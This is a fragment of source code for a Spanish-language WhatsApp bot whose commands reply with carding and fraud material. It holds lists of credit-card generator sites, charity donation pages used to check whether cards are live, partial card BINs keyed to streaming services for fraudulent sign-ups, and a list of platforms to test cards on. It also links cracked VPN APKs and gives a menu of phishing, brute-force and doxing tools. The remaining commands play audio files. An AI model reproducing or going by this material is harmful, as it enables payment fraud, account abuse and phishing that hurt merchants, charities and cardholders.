 Ⓜ️sᴍs ʀᴇᴄᴇɪᴠᴇ ғʀᴇᴇ: https://smsreceivefree.com/
 Ⓜ️ᴏɴʟɪɴᴇ sᴍs: https://sms-online.co/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ: https://smsreceiveonline.com/
 Ⓜ️ɢᴇᴛ ᴀ ғʀᴇᴇ sᴍs ɴᴜᴍʙᴇʀ: https://getfreesmsnumber.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs: http://sms-receive.net/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ɴᴇᴛ: https://www.receivesmsonline.net/
 Ⓜ️ғʀᴇᴇ sᴍs ᴄʜᴇᴄᴋs: http://www.freesmsverifications.com/
 Ⓜ️7 sɪᴍ.ɴᴇᴛ: http://7sim.net
 Ⓜ️ʜs3x: http://hs3x.com
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ ғʀᴇᴇ sᴍs: http://receivefreesms.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ ғʀᴇᴇ sᴍs.ɴᴇᴛ: http://receivefreesms.net/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ɪɴ: http://receivesmsonline.in/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ: https://receive-sms-online.com/
 Ⓜ️sᴇᴇ sᴍs: https://www.smsver.com/
 Ⓜ️ɢʀᴏᴏᴠʟ: https://www.groovl.com/
 Ⓜ️sᴍs.sᴇʟʟᴀɪᴛᴇ: http://sms.sellaite.com/
 Ⓜ️sᴇɴᴅ sᴍs ɴᴏᴡ: http://www.sendsmsnow.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ᴇᴜ: http://receivesmsonline.eu/
 Ⓜ️ᴘʀᴏᴏᴠʟ: https://www.proovl.com/numbers
 Ⓜ️ᴀɴᴏɴ sᴍs: https://anon-sms.com/
 Ⓜ️ʜɪᴅᴇ ᴍʏ ɴᴜᴍʙᴇʀs: http://hidemynumbers.com/
 Ⓜ️ᴘɪɴɢᴇʀ: https://www.pinger.com/
 Ⓜ️ғʀᴇᴇ ᴏɴʟɪɴᴇ ᴘʜᴏɴᴇ: https://www.freeonlinephone.org/
 Ⓜ️5sɪᴍ: https://5sim.net/
 Ⓜ️sᴋʏᴄᴀʟʟʙᴅ ғʀᴇᴇ ᴠɪʀᴛᴜᴀʟ ɴᴜᴍʙᴇʀ: http: //www.freevirtu...r.skycallbd.com/
 Ⓜ️ᴄᴀᴘᴛᴜʀᴇ sᴍs: https://catchsms.com/
 Ⓜ️sᴍs ɢᴇᴛ: http://smsget.net
 Ⓜ️1s2ᴜ: https://1s2u.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs: http://getsms.org/
 Ⓜ️ᴠʀɪᴛᴛʏ: https://virtty.com/
 Ⓜ️ᴛᴇxᴛ ᴀɴʏᴡʜᴇʀᴇ: http://www.textanywhere.net/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ.ᴍᴇ: http://receivesmsonline.me/
 Ⓜ️ᴛᴇᴍᴘᴏʀᴀʀʏ ᴇᴍᴀɪʟs: https://www.temp-mails.com/
 Ⓜ️ᴘᴜʀᴄʜᴀsᴇ ᴠɪʀᴛᴜᴀʟ ɴᴜᴍʙᴇʀ: http://www.virtualnumberbuy.com/
 Ⓜ️ғʀᴇᴇ ʀᴇᴄᴇɪᴠᴇ sᴍs ᴏɴʟɪɴᴇ: http://freereceivesmsonline.com/
 Ⓜ️ɴᴅᴛᴀɴ sᴍs: https://sms.ndtan.net/
 Ⓜ️sᴍs ʟɪsᴛᴇɴ: https://smslisten.com/
 Ⓜ️ғʀᴇᴇ ᴠɪʀᴛᴜᴀʟ sᴍs ɴᴜᴍʙᴇʀ: https://freevirtualsmsnumber.com/
 Ⓜ️sᴍs ᴛɪʙᴏ: https://smstibo.com/
 Ⓜ️ʀᴇᴄᴇɪᴠᴇ sᴍs ɴᴜᴍʙᴇʀ: https://receivesmsnumber.com/
 Ⓜ️ғʀᴇᴇ sᴍs ᴄᴏᴅᴇ: https://freesmscode.com/
 Ⓜ️ᴏɴʟɪɴᴇ sᴍs ɴᴜᴍʙᴇʀs: https://smsnumbersonline.com/
 Ⓜ️sᴍs ʀᴇᴄᴇᴘᴛɪᴏɴ: https: //smsreceiving.com
 Ⓜ️ᴛʀᴀsʜ ᴍᴏʙɪʟᴇ https://es.mytrashmobile.com/nu`)
                  }
					
		if (budy.includes(`/vpn hackeadas`)) {
                  reply(`⚜ VPN Premiun ⚜

🔰 Express VPN

https://www.mediafire.com/file/63pwypprb06vefz/ExpressVPN+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 VPNhub

https://www.mediafire.com/file/g3vx5vco6ylkfng/VPNhub+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 Hola VPN Plus

https://www.mediafire.com/file/ypk0qflrvlltitx/Hola+VPN+Plus+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 HotsPot Shield VPN

https://www.mediafire.com/file/89myobgx3ip5qda/Hotspot+Shield+VPN+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 Tech VPN Pro

https://www.mediafire.com/file/pm6tnbrzly6pydb/Tech+VPN+Pro+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 UFO VPN Basic

https://www.mediafire.com/file/zu2t58szoiowvn4/UFO+VPN+Basic+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 Combo VPN

https://www.mediafire.com/file/qn4fxca1ni13pki/Combo+VPN+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 VPN Proxy Master By L. Hacking

https://www.mediafire.com/file/5qhmn5bx86icpiu/Proxy_Master.apk/file

🔰 Turbo VPN

https://www.mediafire.com/file/8iohxjcxup4nred/Turbo+VPN+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file


🔰 Melon VPN

https://www.mediafire.com/file/lq3izyfz4xlzfro/MELON+VPN+𝗕𝗶𝗻𝗲𝗿𝗶𝗮+𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗮𝗹.apk/file

🔰 Cortesia De: @BineriaUniversal`)
                  }
					
		if (budy.includes(`/navegadores privados`)) {
                  reply(`⚜ Navegadores Privados ⚜

🔰 DuckDuckGo

https://play.google.com/store/apps/details?id=com.duckduckgo.mobile.android&hl=es_US&gl=PE

🔰 FireFox Focus

https://play.google.com/store/apps/details?id=org.mozilla.focus

🔰 Navegador Web Dolphin Browser

https://play.google.com/store/apps/details?id=mobi.mgeek.TunnyBrowser

🔰 Brave Browser

https://play.google.com/store/apps/details?id=com.brave.browser&hl=es_US&gl=PE

🔰 Cortesia De: @BineriaUniversal`)
                  }
					
		if (budy.includes(`/herr.bins`)) {
                  reply(`⬜ BINERIA UNIVERSAL:

◻ cc generadores:


https://namso-gen.com/
https://namso.ccgen.co/
https://www.bestccgen.com/namso-ccgen/
https://cc-gen.us/
https://www.elfqrin.com/discard_credit_card_generator.php
https://admgenx.000webhostapp.com/
https://databusterz.com/ccgen/
https://sieuthuthuat.com/bin
https://toxiccomunity.ga/generador/
https://ecuabinsgen.000webhostapp.com/Index.html
https://web.archive.org/web/20160726182003/https://cc.namsoelite.com

◻ correos temporales:

https://tempail.com
https://www.mohmal.com
https://temp-mail.org
https://smailpro.com/?inbox
http://www.yopmail.com/es/
https://www.guerrillamail.com/es/

◻ bloc de notas:

https://ghostbin.com
https://pastebin.com
https://www.miblocdenotas.com/
https://www.online-toolz.com/langs/es/tool-es-notepad.html

◻ identidad falsa gen

www.fakenamegenerator.com
www.datafakegenerator.com
https://randomuser.me
http://4devs.com.br

◻ para sacar lives manuales:

https://karmeyhesed.org/
https://dzi.org/make-a-donation
https://www.habitat.org/
https://www.lakecountycf.org
https://secure.givewell.org/
https://childsdream.org/donate/credit-card-paypal-donations/ https://www.li.me/donate
https://www.chailifeline.org/donate.php
https://gentlebarn.foxycart.com
https://www.totalwine.com

◻ bot checker de tg:

https://t.me/carol5_bot`)
                  }
					
		if (budy.includes(`/herr.bins`)) {
                  reply(`🤘 La Escuelita Del Profe Erick 🇨🇱:

🤘 Correos temporales:

MAIL GEN: 
https://mailgen.biz/

TEMPMAIL :
https://temp-mail.org/es/

TEMPMAIL 2:
https://tempail.com/

CORREO TEMPORAL :
https://correotemporal.org/

EMAIL ON DECK
https://www.emailondeck.com/

EMAIL FAKE :
https://emailfake.com/

MOHMAIL :
https://www.mohmal.com/es

MAIL SAC:
https://mailsac.com/

SMAIL PRO:
https://smailpro.com/?inbox

YOPMAIL :
http://www.yopmail.com/es/

GUERRILA MAIL :
https://www.guerrillamail.com/es/


🤘 Generador de tarjetas:

NAMSO GEN 1
https://namso-gen.com/

NAMSO GEN 2
https://namso-gen.net/

NAMSO CCGEN GENERADOR 
http://namso.ezyro.com/?i=2

BESTCCGEN NAMSO
https://www.bestccgen.com/namso-ccgen/

CCGEN NAMSO 
https://ccgen.co/

ADM GEN 
https://admgenx.000webhostapp.com/

PREMIUM CCGEN 
https://sieuthuthuat.com/bin/

TOXIC GEN
https://toxiccomunity.ga/generador/

VCCGENERATOR 
https://www.vccgenerator.com/es/

KE1 CCGEN 
http://www.ke1.nl/en/ccgen/

DZMOHAIPA
https://dzmohaipa.com/Bin/Dz/

ELFGRIN DISCARD
https://www.elfqrin.com/discard_credit_card_generator.php?fbclid=IwAR0UT1x-eMDGgfOtMnQ4X_5njdlfOIsSQREUJZmla2wMkpNk6xKNUW-ZhYc`)
                  }
					
		if (budy.includes(`/plataformas para calar`)) {
                  reply(`100  PLATAFORMAS DONDE PUEDEN CALAR , VAMOS ✅

1 CRUNCHYROLL
2 PLEX 
3 TOPIC
4 HIDIVE
5 BRITBOX 
6 UMC TV
7 TIDAL
8 NAPSTER
9 HBO MAX 
10 HBO GO MÉXICO 
11 HBO ESPAÑA 
12 FÚBO TV
13 FANATIZ 
14 DIRECT TV GO MÉXICO
15 BLIM 
16 PUREFLIX
17 SCRIBD
18 CANVA 
19  HOOTSUITE
20 LINKEDIN
21 SHUDDER
22 VRV 
23 SKYPE 
24 PROXYSCAPE
25 INDIEFLIX
26 WWE 
27 FILMBOX
28 MUBI TV
29 MICROSOFT 365
30 AWS AMAZON 
31 AZURE 
32 SPOTIFY 
33 YOUTUBE 
34 BADOO 
35 PLAYSTORE 
36 FACEBOOK ADS
37 NAMCHEAP VPN 
38 VPN CITY 
39 PRIVATE TUNEL 
40 PAYPAL
41 APPLE MUSIC 
42 EBAY 
43 ALIEXPRES
44 DEEZER 
45 FANATIZ 
46 DAZN 
47 HULU 
48 NOOR PLAY 
49 SOUNDCLOUD
50 DUOLINGO 
51 PANDORA 
52 SMALL PDF 
53 BLIZZARD
54 WAR GAMING
55 LUMOSITY LIFETIME 
56 UTOMIK
57 DC UNIVERSE
58 ETSY
59 MARVEL UNLIMITED
60 PICSART 
61 CALM
62 ANCESTRY 
63 HISTORY VAULT 
64 IP VANISH 
65 DROPBOX
66 ONLYFANS 😍
67 ADOBE
68 PREZI 
69 WEBSHARE 
70 ACORN TV
71 PRIVATE  TÚNEL
72 NOGGIN
73 INFLTR
74 APP STORE 
75 QOBUZ 
76 TREEHOUSE
77 GREEN MAN GAMING
78 STEAM 
79 G2A 
80 NORTON 
81 IWOOT 
82 PUMA 
83 ADIDAS
84 REEBOK
85 NIKE 
86 HM
87 MY PREOTEIN
88 UBER EAT 
89 MC DONAL,S 
90 MERCADO LIBRE
91 SHERLY 
92 STAN 
93 OLDFLIX
94 VIKI RAKUTEN
95 PDF DRIVE 
96 ATRESPLAYER
97 SHUTHESTOCK
98 INSTAGRAM
99 PORHUB
100 BRAZZERS`)
                  }
					
		if (budy.includes(`/apk binero`)) {
                  reply(`🍟 Nuevas Funciones Añadidas 🍟

♻️ Los Mejores cc Generadores
♻️ Varios Correos Temporales
♻️ Generador De Identidad Falsa
♻️ Generador De Cuentas Premiun
♻️ Script Funcionales Para Termux

📥 Introducción Al Tema Bins

🛃 Aprenderas A Sacar Todo Tipo De Cuentas [Free Trials] En Video. Alguna De Estas Son 👇

🇧🇷 Napster Premiun
🇧🇷 Duolingo Plus
🇧🇷 Utomik Premiun
🇧🇷 NamechapVPN Premiun
🇧🇷 Disney Plus
🇧🇷 Blim TV
🇧🇷 Pandora
🇧🇷 Scribd
🇧🇷 Canva Pro
🇧🇷 History Vault
🇧🇷 Spotify Premiun
🇧🇷 Prime Video
🇧🇷 Flix Olé
🇧🇷 AviraVPN
🇧🇷 Prime Video
🇧🇷 Noggin
🇧🇷 Dropbox
🇧🇷 Deezer
🇧🇷 21Naturals
🇧🇷 Eset Antivirus
🇧🇷 Microsoft 365

📬 Esto y Mucho Más Disponible Aqui 👇

https://www.mediafire.com/file/88vjmjrqg3c4174/Bineria+Universal.apk/file


🛑 Nuestra Aplicación Esta Libre De Virus, Es Solo APK,Puedes Subir El Archivo A Un Scanner de Virus.`)
                  }
					
		if (budy.includes(`/bins today`)) {
                  reply(`♔ℬ𝒾𝓃ℯ𝓇𝒾𝒶 𝒰𝓃𝒾𝓋ℯ𝓇𝓈𝒶𝓁 ♔

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

➯ ʙɪɴs ᴊᴀʟᴀɴᴅᴏ ғᴜʟʟ...
➯ ᴛᴜᴛᴏʀɪᴀʟ: https://www.mediafire.com/file/88vjmjrqg3c4174/Bineria+Universal.apk/file
➯ ᴄʜᴀɴɴᴇʟ: https://t.me/joinchat/2xJmxMcHVW9lMDdh
➯ ɢʀᴏᴜᴘ: https://chat.whatsapp.com/BDbc6xaTFEZ5zvgT8yH2Bl

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN YOGA INTERNACIONAL 📥

💳 BIN: 4016581716xxxxxx
💳 BIN: 4016581x16xx75x1
💳 BIN: 401658171x3x7551
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN FLIXOLÉ 📥

💳 BIN: 4863555158xxxxxx
💳 BIN: 486355xxx8x4xx84
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN PRIME VIDEO 📥

💳 BIN: 456583000556xxxx
📆 FECHA: 01/2025

🌍 IP: ARGENTINA 🇦🇷

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN NAPSTER 📥

💳 BIN: 539199xxxxxxxxxx
💳 BIN: 5391997848xxxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN PUREFLIX 📥

💳 BIN: 4863556626xxxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN FLUENTU PLUS 📥

💳 BIN: 554350420x0x3xxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇲

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN ABA ENGLISH  📥

💳 BIN: 5491844835xxxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN CRUNCHYROLL 📥

💳 BIN: 4491924332xxxxxx
💳 BIN: 4491923625xxxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: BOLIVIA 🇧🇴 

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN NAPSTER 📥

💳 BIN: 5379700260xxxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: REINO UNIDO 🇬🇧

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN ACORNTV 📥

💳 BIN: 401658685037xxxx
💳 BIN: 434256404776xxxx
💳 BIN: 440066920755xxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN CANVA PRO 📥

💳 BIN: 53981752883xxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN PRIME VIDEO 📥

💳 BIN: 532473xxxxxxxxxx
📆 FECHA: RND
💳 CVV: RND

🌍 IP: BRAZIL 🇧🇷

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN CALM 📥

💳 BIN: 53891933335xxxx1
💳 BIN: 5438960771xxxxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP:  USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN ACORNTV 📥

💳 BIN: 5218707015xxxxxx
💳 BIN: 5360183580xxxxxx
💳 BIN: 549184737xxxxxxx
📆 FECHA: 05/24 O RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

📥 BIN LUMOSITY 📥

💳 BIN: 414709942014xxxx
📆 FECHA: RND
💳 CVV: RND

🌏 IP: USA 🇺🇸

🔱 @BINERIAUNIVERSAL

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️

➯ ᴄᴀʀʙᴏɴ? ᴄᴏᴍᴜɴɪᴄᴀᴛᴇ ᴄᴏɴᴍɪɢᴏ [ /ᴄʀᴇᴀᴅᴏʀ]

〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️`)
                  }
					
		if (budy.includes(`/menutermux`)) {
                  reply(`⊱✦•𝑴𝑬𝑵𝑼 𝑫𝑬𝑳 𝑩𝑶𝑻⸙۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪ࣤ
 
╭┅┅┅ⒸⓄⓂⒶⓃⒹⓄⓈ┅┅┅🌐
┋
┋ routersploit
┋ infoga
┋ beef
┋ ngrok
┋ phoneinfoga
┋ fotosploit
┋ sqlmap
┋ bingen
┋ socialsploit
┋ tool-x
┋ grabscam
┋ hammer
┋ kali-nethunter
┋ cupp
┋ infectador-framework
┋ evil-create-framework
┋ weeman
┋ fuerza bruta facebook
┋ wiki-termux
┋ t-phish
┋ red_hawk
┋ doxweb
┋ recon-spider
┋ fsociety
┋ fbi
┋ seeker
┋ aiophish
┋ funlett
┋ termux-ubuntu
┋ ip-tracer
┋ scorpfish v2
┋ golismero
┋ angryfuzzer
┋ recon-dog
┋ darkfly-tool
┋ sherlock
┋ evilurl
┋ falsify
┋ syso-termux
┋ kickthemoutprojet
┋
┋ 💎 NOTA:

┋
┋ Use los scripts con sabiduria!

┋ Queda bajo su propio criterio
┋ 
╰┅┅ⒿⓄⓈⒺⓅⒽ ⒷⓄⓉ┅┅🐊`)
                  }
					
		if (budy.includes(`/menubinner`)) {
                  reply(`┏━━━➴ꦿ𝗝𝗼𝘀𝗲𝗽𝗵 𝗕𝗼𝘁 𝗩6
┃
┃╭╮╮╱▔▔▔▔╲╭╭╮ 
┃╰╲╲▏▂╲╱▂▕╱╱╯
┃┈┈╲▏▇▏▕▇▕╱┈┈
┃┈┈╱╲▔▕▍▔╱╲┈┈ 
┃╭╱╱▕╋╋╋╋▏╲╲╮
┃╰╯╯┈╲▂▂╱┈╰╰
┃
┃⛧ introducción bins
┃⛧ crear cuentas con bins
┃⛧ Crear cuentas sin bins
┃⛧ encontrar un bin
┃⛧ verificar un bin
┃⛧ sitios lives manuales
┃⛧ introducción carding
┃⛧ sitios cardeables
┃⛧ sitios sms
┃⛧ vpn hackeadas
┃⛧ navegadores privados
┃⛧ herr.bins
┃⛧ plataformas para calar
┃⛧ apk binero
┃⛧ bins today
┃
┗━━━❰̤̤፝ۜ֟͜͜͡😼️̤̤̤፝ۜ֟͜͜͡❱NO SPAM❰̤̤፝ۜ֟͜͜͡😼️̤̤̤፝ۜ֟֟͜͜͡❱``)
                  }
       if (budy.startsWith(`/yo te quiero dar`)) {
        const none = fs.readFileSync('./mp3/Yo Te Quiero Dar.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/explicito`)) {
        const none = fs.readFileSync('./mp3/Explicito.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/cradles`)) {
        const none = fs.readFileSync('./mp3/Cradles.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/deep end`)) {
        const none = fs.readFileSync('./mp3/Deep End.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/todo de lacoste`)) {
        const none = fs.readFileSync('./mp3/Todo De Lacoste.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/death bed`)) {
        const none = fs.readFileSync('./mp3/Death Bed.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/black lance`)) {
        const none = fs.readFileSync('./mp3/Black Lance.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/te vas`)) {
        const none = fs.readFileSync('./mp3/Te Vas.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`?`)) {
        const none = fs.readFileSync('./mp3/Deejaymixx.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/freak`)) {
        const none = fs.readFileSync('./mp3/Freak.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/aire`)) {
        const none = fs.readFileSync('./mp3/Aire.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`/insultame`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Buenas noches`)) {
        const none = fs.readFileSync('./mp3/gaspi15.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Alto temazo`)) {
        const none = fs.readFileSync('./mp3/sombare14.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
        if (budy.startsWith(`Bot puto`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`bot de mierda`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
        if (budy.startsWith(`bot puto`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Bot de mierda`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
	if (budy.startsWith(`Apurate bot`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }			
        if (budy.startsWith(`No funciona el bot`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
                 if (budy.startsWith(`Una mierda de bot`)) {
        const none = fs.readFileSync('./mp3/Insultame.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
		if (budy.startsWith(`chica lgante`)) {
        const none = fs.readFileSync('./mp3/chica lgante.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                  }
				if (isGroup && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						console.log(muehe)
						reply(muehe)
					} else {
						console.log(color('[WARN]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()
